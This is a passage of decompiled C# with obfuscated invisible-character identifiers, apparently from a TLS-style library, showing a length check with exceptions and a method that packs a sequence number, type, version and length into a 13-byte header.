      int num5 = num3 + this.\u206C‬‬‎​‎⁪‪‪‍⁮‭‎‍‫⁯⁯‪‏‎‪⁬‍​‬‬​⁪⁮‫‌‍‏‍⁪‭‭‏⁯‎‮.\u206D‫⁭‪‭‏‎‌⁪⁪⁯‪​‌⁯‪‮⁮⁭‎⁪​⁯⁮‪‬‮⁪‭‬‍‫⁪⁭‍⁪‏⁪⁬‪‮(_param3, num1, num2, numArray1, num3);
      num4 = num5 + this.\u206C‬‬‎​‎⁪‪‪‍⁮‭‎‍‫⁯⁯‪‏‎‪⁬‍​‬‬​⁪⁮‫‌‍‏‍⁪‭‭‏⁯‎‮.\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(numArray1, num5);
    }
    catch (Exception ex)
    {
      throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 20, ex);
    }
    if (num4 != numArray1.Length)
      throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 80);
    return numArray1;
  }

  protected virtual byte[] \u200C‏‎⁮⁪⁭‮⁭⁪‍‎‏‎‮‎⁮‭‌‎‬⁮​⁯‮‪⁫‎‬⁮‫⁬‌⁫‫⁪⁮‎‏‌‭‮(
    long _param1,
    byte _param2,
    int _param3)
  {
    byte[] numArray = new byte[13];
    \u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u200F⁪⁮‏‮‬‪‮‏⁭⁯‏‍‎⁮‫‏‪‭‌‌‪⁯‭⁪⁭⁪​‎‌‏‮‌‏‫​⁬‮⁮‍‮(_param1, numArray, 0);
    \u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u200C‭‬⁬⁭‮​⁫‏‬⁫‪‪‫‌‎⁫⁯⁯‫​⁫‍‮‪‏‬‎‍⁮‮‪⁪⁪​⁬‮⁪‮‫‮(_param2, numArray, 8);
    \u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u200F​‎‏⁮‎⁫‬⁪⁪⁫⁭⁭⁪‌⁫⁭‭​⁪‬‬⁪⁪⁪‪⁭⁬⁫⁬‎‭‭‏‬⁬‫⁪​‬‮(this.\u202A‮⁫‬‪⁮‌⁬‌⁪‫‌⁯‪‏‍⁮⁮⁫⁬⁯‌‮‎‪⁫‏‪‬⁭⁬⁪⁭‮‏⁭​⁯‍⁯‮.\u200D⁯⁬​‬⁬⁮⁭⁭‎‏‮‭⁭‏​⁯‪⁭⁮⁭‪⁭⁭⁮​‍‪‬⁪⁭⁪⁫‬‬‏⁫⁪‏⁭‮, numArray, 9);
    \u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u200D‫‫‏​​⁮‏‪⁫​⁫⁪⁯⁭‏‏⁫‭⁮⁮⁬‮‮⁪‭‭‪⁭‬‎‫‬‎‎⁪‫‫⁯‫‮(_param3, numArray, 11);
    return numArray;
  }
}
